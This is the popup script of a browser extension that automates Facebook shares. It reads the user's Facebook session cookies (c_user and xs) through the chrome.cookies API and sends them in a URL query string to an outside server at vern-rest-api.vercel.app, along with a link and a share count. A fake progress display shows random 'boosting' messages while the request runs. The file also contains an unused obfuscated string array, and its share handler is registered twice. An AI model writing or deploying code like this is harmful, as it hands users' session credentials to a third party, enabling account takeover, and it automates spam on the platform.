const stringArray = ['59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=', '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status', 'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=', '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!', 'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit', 'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies', 'classList', 'change', '; xs=', 'query', 'c_user', 'trim', '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count', 'getElementById', ' times!', 'find', 'tutorials', 'style', 'link', '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...', '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET', 'dark', 'developer', 'value', 'json'];

function getString(index) {
    const adjustedIndex = index - 0xaa; 
    return stringArray[adjustedIndex];
}

const burger = document.getElementById('burger');
const navLinks = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn = document.getElementById('backBtn');
const shareBtn = document.getElementById('shareBtn');
const statusEl = document.getElementById('status');
const cookieInput = document.getElementById('cookie');
const linkInput = document.getElementById('link');
const limitInput = document.getElementById('limit');
const menuOverlay = document.getElementById('menuOverlay');


burger.addEventListener('click', () => {
    navLinks.classList.toggle('active');
    if (menuOverlay) {
        menuOverlay.classList.toggle('active');
        document.body.style.overflow = navLinks.classList.contains('active') ? 'hidden' : '';
    }
});

if (menuOverlay) {
    menuOverlay.addEventListener('click', () => {
        navLinks.classList.remove('active');
        menuOverlay.classList.remove('active');
        document.body.style.overflow = '';
    });
}

darkModeSwitch.addEventListener('change', function() {
    if (this.checked) {
        document.body.classList.remove('light');
        document.body.classList.add('dark');
        document.body.style.color = '#fff';
    } else {
        document.body.classList.remove('dark');
        document.body.classList.add('light');
        document.body.style.color = '#000';
    }
    localStorage.setItem('darkMode', this.checked);
});

if (localStorage.getItem('darkMode') === 'true') {
    darkModeSwitch.checked = true;
    document.body.classList.remove('light');
    document.body.classList.add('dark');
    document.body.style.color = '#fff';
}

developerBtn.addEventListener('click', () => {
    window.open('https://www.facebook.com/notfound500', '_self');
});

tutorialsBtn.addEventListener('click', () => {
    window.open('tutorial.html', '_blank');
});

backBtn.addEventListener('click', () => {
    window.open('features.html', '_self');
});

shareBtn.addEventListener('click', async () => {
    const cookieValue = cookieInput.value.trim();
    const linkValue = linkInput.value.trim();
    const limitValue = limitInput.value.trim();

    if (!cookieValue || !linkValue || !limitValue) {
        statusEl.textContent = '❌ Please fill all fields!';
        statusEl.style.color = '#fecaca';
        return;
    }

    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
    statusEl.style.color = '#fff';
    
    try {
        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
                      encodeURIComponent(cookieValue) + 
                      '&link=' + encodeURIComponent(linkValue) + 
                      '&limit=' + encodeURIComponent(limitValue);

        const response = await fetch(apiUrl, {
            method: 'GET'
        });
        
        const data = await response.json();
        
        if (data.status) {
            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
            statusEl.style.color = '#d1fae5';
        } else {
            statusEl.textContent = '❌ ' + (data.message || 'Error! Check network or cookie.');
            statusEl.style.color = '#fecaca';
        }
    } catch (error) {
        statusEl.textContent = 'Failed to share.';
        statusEl.style.color = '#fecaca';
        console.error(error);
    }
});


chrome.tabs.query({'active': true, 'currentWindow': true}, (tabs) => {
    const currentTab = tabs[0];
    if (!currentTab) return;
    
    chrome.cookies.getAll({'url': 'https://www.facebook.com'}, (cookies) => {
        const c_userCookie = cookies.find(cookie => cookie.name === 'c_user');
        const xsCookie = cookies.find(cookie => cookie.name === 'xs');
        
        if (c_userCookie && xsCookie) {
            cookieInput.value = 'c_user=' + c_userCookie.value + '; xs=' + xsCookie.value + ';';

            cookieInput.style.transition = 'all 0.5s ease';
            cookieInput.style.borderColor = '#00ff88';
            cookieInput.style.boxShadow = '0 0 15px rgba(0,255,136,0.3)';

            setTimeout(() => {
                cookieInput.style.borderColor = '';
                cookieInput.style.boxShadow = '';
            }, 1500);
        }
    });
});


const ProcessingUI = {
    show: function(limitValue) {
        const overlay = document.createElement('div');
        overlay.id = 'boost-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 15, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            backdrop-filter: blur(10px);
            font-family: 'Poppins', sans-serif;
        `;

        const container = document.createElement('div');
        container.style.cssText = `
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            color: white;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            border: 2px solid rgba(255,255,255,0.1);
        `;

        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            @keyframes pulse {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.8; }
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0px); }
                50% { transform: translateY(-10px); }
            }
            
            @keyframes progressFill {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            @keyframes glow {
                0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.5); }
                50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.8); }
            }
        `;
        document.head.appendChild(style);

        const header = document.createElement('div');
        header.innerHTML = `
            <div style="font-size: 60px; margin-bottom: 20px; animation: float 3s infinite;">
                <i class="fas fa-rocket"></i>
            </div>
            <h1 style="margin: 0 0 10px 0; font-size: 28px; font-weight: 700;">🚀 BOOSTING IN PROGRESS</h1>
            <p style="margin: 0 0 30px 0; opacity: 0.9; font-size: 16px;">
                Sharing <strong>${limitValue}</strong> times for maximum engagement
            </p>
        `;

        const progressContainer = document.createElement('div');
        progressContainer.style.cssText = `
            width: 100%;
            height: 12px;
            background: rgba(255,255,255,0.15);
            border-radius: 6px;
            overflow: hidden;
            margin: 30px 0;
            position: relative;
        `;
        
        const progressBar = document.createElement('div');
        progressBar.style.cssText = `
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            border-radius: 6px;
            transition: width 0.3s ease;
        `;
        progressContainer.appendChild(progressBar);

        const loadingIndicator = document.createElement('div');
        loadingIndicator.innerHTML = `
            <div style="display: flex; justify-content: center; align-items: center; gap: 15px; margin: 20px 0;">
                <div style="animation: spin 1.5s linear infinite; font-size: 24px;">
                    <i class="fas fa-sync-alt"></i>
                </div>
                <div style="font-size: 18px; font-weight: 600;">
                    Processing Shares...
                </div>
            </div>
        `;

        const statsGrid = document.createElement('div');
        statsGrid.style.cssText = `
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin: 30px 0;
        `;
        
        const stats = [
            { id: 'boost-current', icon: 'fa-share-alt', label: 'SHARED', value: '0' },
            { id: 'boost-speed', icon: 'fa-tachometer-alt', label: 'SPEED', value: 'MAX' },
            { id: 'boost-progress', icon: 'fa-chart-bar', label: 'PROGRESS', value: '0%' }
        ];
        
        stats.forEach(stat => {
            const statCard = document.createElement('div');
            statCard.style.cssText = `
                background: rgba(255,255,255,0.1);
                padding: 15px;
                border-radius: 10px;
                backdrop-filter: blur(5px);
            `;
            statCard.innerHTML = `
                <div style="font-size: 20px; margin-bottom: 8px; color: #00ccff;">
                    <i class="fas ${stat.icon}"></i>
                </div>
                <div id="${stat.id}" style="font-size: 22px; font-weight: 700; margin-bottom: 5px;">
                    ${stat.value}
                </div>
                <div style="font-size: 12px; opacity: 0.8; letter-spacing: 1px;">
                    ${stat.label}
                </div>
            `;
            statsGrid.appendChild(statCard);
        });

        const statusBox = document.createElement('div');
        statusBox.id = 'boost-status';
        statusBox.style.cssText = `
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            border-left: 4px solid #00ff88;
        `;
        statusBox.textContent = '🔄 Initializing boost sequence...';

        container.appendChild(header);
        container.appendChild(progressContainer);
        container.appendChild(loadingIndicator);
        container.appendChild(statsGrid);
        container.appendChild(statusBox);
        overlay.appendChild(container);
        document.body.appendChild(overlay);

        this.progressInterval = setInterval(() => {
            const currentEl = document.getElementById('boost-current');
            const progressEl = document.getElementById('boost-progress');
            const statusEl = document.getElementById('boost-status');
            
            if (currentEl && progressEl && statusEl) {
                const current = parseInt(currentEl.textContent) || 0;
                const total = parseInt(limitValue) || 100;
                const newCurrent = Math.min(total, current + Math.floor(Math.random() * 3) + 1);
                const progress = Math.floor((newCurrent / total) * 100);

                currentEl.textContent = newCurrent;
                progressEl.textContent = progress + '%';
                progressBar.style.width = progress + '%';

                const messages = [
                    '🎯 Targeting viral audiences...',
                    '⚡ Accelerating share velocity...',
                    '🔍 Analyzing engagement patterns...',
                    '📈 Optimizing reach algorithm...',
                    '🔄 Syncing with Facebook servers...',
                    '🚀 Deploying share batches...',
                    '💫 Generating social momentum...',
                    '✅ Finalizing distribution...'
                ];
                
                if (progress < 100) {
                    const randomIndex = Math.floor(Math.random() * messages.length);
                    statusEl.textContent = messages[randomIndex];
                }
            }
        }, 500);

        this.overlay = overlay;
        this.progressBar = progressBar;
        
        return this;
    },

    updateStatus: function(message) {
        const statusEl = document.getElementById('boost-status');
        if (statusEl) {
            statusEl.textContent = message;
        }
    },

    updateStats: function(shares, progress) {
        const currentEl = document.getElementById('boost-current');
        const progressEl = document.getElementById('boost-progress');
        
        if (currentEl) currentEl.textContent = shares;
        if (progressEl) progressEl.textContent = progress + '%';
        if (this.progressBar) this.progressBar.style.width = progress + '%';
    },

    hide: function() {
        if (this.overlay && document.body.contains(this.overlay)) {
            this.overlay.style.opacity = '0';
            this.overlay.style.transition = 'opacity 0.5s ease';
            
            setTimeout(() => {
                if (this.overlay && document.body.contains(this.overlay)) {
                    document.body.removeChild(this.overlay);
                }
            }, 500);
        }
        
        if (this.progressInterval) {
            clearInterval(this.progressInterval);
        }
    },

    showCelebration: function(count) {
        const celebration = document.createElement('div');
        celebration.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
        `;

        for (let i = 0; i < 50; i++) {
            const confetti = document.createElement('div');
            confetti.style.cssText = `
                position: absolute;
                width: 10px;
                height: 10px;
                background: ${['#ff0088', '#00ff88', '#00ccff', '#ffcc00'][Math.floor(Math.random() * 4)]};
                border-radius: 50%;
                animation: confettiFall ${Math.random() * 2 + 1}s linear forwards;
                top: -20px;
                left: ${Math.random() * 100}vw;
            `;
            
            const confettiStyle = document.createElement('style');
            confettiStyle.textContent = `
                @keyframes confettiFall {
                    0% {
                        transform: translateY(0) rotate(0deg);
                        opacity: 1;
                    }
                    100% {
                        transform: translateY(100vh) rotate(${Math.random() * 360}deg);
                        opacity: 0;
                    }
                }
            `;
            document.head.appendChild(confettiStyle);
            
            celebration.appendChild(confetti);
        }

        const message = document.createElement('div');
        message.style.cssText = `
            background: rgba(0, 255, 136, 0.9);
            color: #000;
            padding: 30px 50px;
            border-radius: 15px;
            font-size: 32px;
            font-weight: 800;
            text-align: center;
            animation: popIn 0.5s ease-out;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 3px solid white;
        `;
        message.innerHTML = `
            <div style="font-size: 48px; margin-bottom: 10px;">🎉</div>
            <div>SUCCESS!</div>
            <div style="font-size: 20px; margin-top: 10px;">${count} Shares Completed</div>
        `;

        const popStyle = document.createElement('style');
        popStyle.textContent = `
            @keyframes popIn {
                0% { transform: scale(0.5); opacity: 0; }
                100% { transform: scale(1); opacity: 1; }
            }
        `;
        document.head.appendChild(popStyle);
        
        celebration.appendChild(message);
        document.body.appendChild(celebration);

        setTimeout(() => {
            if (document.body.contains(celebration)) {
                document.body.removeChild(celebration);
            }
        }, 3000);
    }
};

const originalShareFunction = shareBtn.onclick;

shareBtn.addEventListener('click', async function() {
    const cookieValue = cookieInput.value.trim();
    const linkValue = linkInput.value.trim();
    const limitValue = limitInput.value.trim();

    if (!cookieValue || !linkValue || !limitValue) {
        statusEl.textContent = '❌ Please fill all fields!';
        statusEl.style.color = '#fecaca';
        return;
    }

    const processingUI = ProcessingUI.show(limitValue);

    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
    statusEl.style.color = '#fff';
    
    try {
        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
                      encodeURIComponent(cookieValue) + 
                      '&link=' + encodeURIComponent(linkValue) + 
                      '&limit=' + encodeURIComponent(limitValue);
        
        const response = await fetch(apiUrl, { method: 'GET' });
        const data = await response.json();

        setTimeout(() => {
            processingUI.hide();
        }, 1000);

        if (data.status) {
            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
            statusEl.style.color = '#d1fae5';
            
            if (data.success_count > 0) {
                processingUI.showCelebration(data.success_count);
            }
        } else {
            statusEl.textContent = '❌ ' + (data.message || 'Error! Check network or cookie.');
            statusEl.style.color = '#fecaca';
            processingUI.updateStatus('❌ Failed to boost shares');
        }
    } catch (error) {
        processingUI.hide();
        statusEl.textContent = 'Failed to share.';
        statusEl.style.color = '#fecaca';
        console.error(error);
    }
});

console.log('✅ FB Share Extension Loaded Successfully!');
console.log('✅ Menu Overlay: ' + (menuOverlay ? 'Found' : 'Not Found'));
console.log('✅ Auto-fill cookies functionality: ACTIVE');
console.log('✅ Processing UI: READY');
console.log('✅ BOMBA NA!! 🍪');
